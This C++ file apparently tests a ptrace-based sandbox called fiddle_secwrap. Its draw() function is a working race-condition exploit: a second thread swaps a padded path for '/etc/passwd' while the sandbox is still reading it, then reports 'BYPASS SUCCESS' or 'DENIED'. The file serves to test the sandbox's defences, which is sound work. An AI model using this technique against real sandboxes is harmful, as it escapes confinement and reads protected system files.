#include <atomic>
#include <cstring>
#include <fcntl.h>
#include <iostream>
#include <sys/syscall.h>
#include <thread>
#include <unistd.h>
#include <vector>

void draw(void* canvas) {
    // Allocate a 96 KB path starting with "/tmp/" followed by '/' padding and "a\0".
    // readString in fiddle_secwrap reads 8 bytes per PtracePeekData syscall (up to 128 KB).
    // While readString is mid-way through reading the '/' padding, the second thread
    // overwrites the beginning of the buffer with "/etc/passwd\0" so the kernel opens
    // /etc/passwd when the syscall is resumed.
    const size_t kBufSize = 96 * 1024;
    std::vector<char> buf(kBufSize, '/');
    memcpy(buf.data(), "/tmp/", 5);
    buf[kBufSize - 2] = 'a';
    buf[kBufSize - 1] = '\0';

    std::atomic<int> stage{0};

    std::thread modifier([&]() {
        stage.store(1, std::memory_order_release);
        while (stage.load(std::memory_order_acquire) != 2) {
        }
        // Pure user-space spin (no syscalls) so fiddle_secwrap reads past buf[0..15]
        // in readString before we overwrite buf[0..11] with "/etc/passwd\0".
        for (volatile long i = 0; i < 2000000; ++i) {
        }
        memcpy(buf.data(), "/etc/passwd", 12);
        // Shorten the remaining '/' run so readString finishes quickly.
        for (size_t offset = 88 * 1024; offset >= 8 * 1024; offset -= 8 * 1024) {
            buf[offset] = 'a';
            buf[offset + 1] = '\0';
        }
        stage.store(3, std::memory_order_release);
    });

    while (stage.load(std::memory_order_acquire) != 1) {
    }
    stage.store(2, std::memory_order_release);
    long fd = syscall(SYS_openat, AT_FDCWD, buf.data(), O_RDONLY);
    modifier.join();

    if (fd >= 0) {
        std::cout << "BYPASS SUCCESS (toctou openat)" << std::endl;
        close(fd);
        return;
    }

    // If the TOCTOU window was closed, buf.data() now holds "/etc/passwd",
    // which fiddle_secwrap must reject and terminate.
    fd = syscall(SYS_openat, AT_FDCWD, buf.data(), O_RDONLY);
    if (fd >= 0) {
        std::cout << "BYPASS SUCCESS (toctou openat)" << std::endl;
        close(fd);
        return;
    }
    std::cout << "DENIED" << std::endl;
}

